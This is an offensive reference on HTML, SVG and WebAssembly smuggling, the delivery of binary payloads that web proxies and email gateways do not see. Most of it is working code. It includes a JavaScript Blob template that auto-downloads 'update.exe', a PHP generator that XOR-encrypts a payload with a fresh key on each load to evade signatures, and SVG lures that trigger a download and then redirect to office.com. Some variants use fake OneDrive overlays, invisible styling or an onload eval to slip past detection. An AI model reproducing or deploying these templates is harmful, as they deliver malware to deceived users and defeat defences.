# Smuggling Techniques Reference

## HTML Smuggling

### Concept
Embed a payload (binary file) inside an HTML page using JavaScript. The browser reconstructs the file client-side via Blob API and triggers a download. Web proxies see only HTML/JS — the actual binary never crosses the network as a file.

### Basic Template (Static Base64)
```html
<html><body><script>
function base64ToArrayBuffer(base64) {
    var bin = window.atob(base64);
    var bytes = new Uint8Array(bin.length);
    for (var i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
    return bytes.buffer;
}
var file = 'TVqQAAMAAAA...'; // Base64 of binary
var data = base64ToArrayBuffer(file);
var blob = new Blob([data], {type: 'octet/stream'});
var url = window.URL.createObjectURL(blob);
var a = document.createElement('a');
document.body.appendChild(a);
a.style = 'display: none';
a.href = url;
a.download = 'update.exe';
a.click();
window.URL.revokeObjectURL(url);
</script></body></html>
```

**Weakness**: Static Base64 is easily signatured. Use dynamic XOR instead.

### Improved: Dynamic XOR Encrypted (PHP)
Key changes every page load — signature changes every time.

```php
<?php
$filePath = '/var/www/payload.exe';
$binaryData = file_get_contents($filePath);
$key = bin2hex(random_bytes(16));

function xorEncrypt($input, $key) {
    $output = '';
    $keyLen = strlen($key);
    for ($i = 0; $i < strlen($input); $i++) {
        $output .= chr(ord($input[$i]) ^ ord($key[$i % $keyLen]));
    }
    return $output;
}

$encrypted = xorEncrypt($binaryData, $key);
$hexEncoded = bin2hex($encrypted);

echo <<<HTML
<!DOCTYPE html>
<html><head><script>
document.addEventListener('DOMContentLoaded', function() {
    var hex = document.getElementById('d').textContent;
    function xorDecrypt(hex, key) {
        var bin = '';
        for (var i = 0; i < hex.length; i += 2)
            bin += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
        var out = '', ki = 0;
        for (var i = 0; i < bin.length; i++) {
            out += String.fromCharCode(bin.charCodeAt(i) ^ key.charCodeAt(ki));
            ki = (ki + 1) % key.length;
        }
        var bytes = new Uint8Array(out.length);
        for (var i = 0; i < out.length; i++) bytes[i] = out.charCodeAt(i);
        var blob = new Blob([bytes], { type: 'octet/stream' });
        var url = URL.createObjectURL(blob);
        var dl = document.getElementById('b');
        dl.href = url;
        dl.click();
    }
    xorDecrypt(hex, '$key');
});
</script></head>
<body>
    <div id="d" style="display:none;">$hexEncoded</div>
    <a href="" download="update.exe" style="visibility:hidden" id="b">.</a>
</body></html>
HTML;
?>
```

### Improved v2: File-Based (Hex in .txt)
Instead of embedding hex inline, write it to a `.txt` file and fetch via JS:

```php
<?php
$txtFile = bin2hex(random_bytes(16)) . '.txt';
file_put_contents($txtFile, $hexEncoded);
?>
```

---

## SVG Smuggling

### Concept
SVG files are XML-based and can embed JavaScript. Unlike PNG/JPG, SVGs execute scripts when opened in a browser. This makes them effective payload carriers — email gateways often don't restrict SVG attachments.

### Key SVG Differences from HTML
- Use `document.createElementNS('http://www.w3.org/1999/xhtml', 'a')` instead of `document.createElement('a')`
- Use `document.documentElement.appendChild()` instead of `document.body.appendChild()` (no `body` in SVG)
- Wrap JS in `<script type="text/javascript"><![CDATA[ ... ]]></script>`

### SVG Smuggling via Script Tag
```xml
<?xml version="1.0" encoding="UTF-8"?>
<svg width="800px" height="800px" viewBox="0 0 48 48"
  xmlns="http://www.w3.org/2000/svg">
  <script type="text/javascript"><![CDATA[
    function decodeBase64(b64) {
      var base64 = b64.replace(/[^A-Za-z0-9+\/]/g, '');
      var output = [];
      var table = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
      for (var i = 0, buffer = 0, bits = 0; i < base64.length; i++) {
        var val = table.indexOf(base64.charAt(i));
        if (val === -1) continue;
        buffer = (buffer << 6) | val;
        bits += 6;
        if (bits >= 8) { bits -= 8; output.push((buffer >> bits) & 0xff); }
      }
      var array = new Uint8Array(output.length);
      for (var j = 0; j < output.length; j++) array[j] = output[j];
      return array;
    }

    function triggerDownload(data, filename) {
      var blob = new Blob([data], { type: 'application/octet-stream' });
      var url = (self.URL || self.webkitURL).createObjectURL(blob);
      var anchor = document.createElementNS('http://www.w3.org/1999/xhtml', 'a');
      anchor.href = url;
      anchor.download = filename;
      anchor.style.display = 'none';
      document.documentElement.appendChild(anchor);
      anchor.dispatchEvent(new MouseEvent('click', { view: window, bubbles: true, cancelable: true }));
    }

    var payload = 'BASE64_PAYLOAD_HERE';
    triggerDownload(decodeBase64(payload), 'Document.zip');
  ]]></script>
  <defs><style>.b{fill:#000}.c{fill:none;stroke:#000;stroke-linecap:round;stroke-linejoin:round}</style></defs>
  <path class="c" d="M13.8571,15.1364h20.2857"/>
</svg>
```

### SVG with Redirect After Download
```javascript
location.href = "https://office.com";
```

And make the SVG invisible:
```xml
<style>.b{fill:none}.c{fill:none;stroke:none}</style>
```

### SVG with Image Overlays
Embed Base64 images for a professional look (e.g., blurred OneDrive + "Document shared" dialog):
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
  width="100%" height="100%" viewBox="0 0 800 600" preserveAspectRatio="none">
  <image x="0" y="0" width="100%" height="100%" preserveAspectRatio="none"
    xlink:href="data:image/png;base64,BLURRED_BG_BASE64"/>
  <image width="300" height="220" x="250" y="190"
    xlink:href="data:image/png;base64,OVERLAY_BASE64"/>
  <script type="text/javascript"><![CDATA[
  ]]></script>
</svg>
```

### SVG via Inline onload (No Script Tags)
Avoids `<script>` tag detection:
```xml
<svg width="800px" height="800px" viewBox="0 0 48 48"
  xmlns="http://www.w3.org/2000/svg"
  onload="eval(decodeURIComponent('URLENCODED_JS_HERE'))">
  <!-- SVG content -->
</svg>
```

URL-encode the smuggling JS with `encodeURIComponent()` first.

---

## WebAssembly Smuggling

### Concept
Use WASM to decode/decrypt the payload instead of JavaScript. WASM bytecode is harder to analyze statically than JS.

### Approach
1. Write a simple C/Rust decoder (e.g., XOR decrypt)
2. Compile to WASM
3. Load WASM in the HTML page
4. Pass encrypted payload to WASM for decryption
5. Return decrypted bytes to JS, create Blob, trigger download

```javascript
const wasmModule = await WebAssembly.instantiateStreaming(fetch('decoder.wasm'));
const decryptedBytes = wasmModule.instance.exports.decrypt(encryptedPayload, key);
```
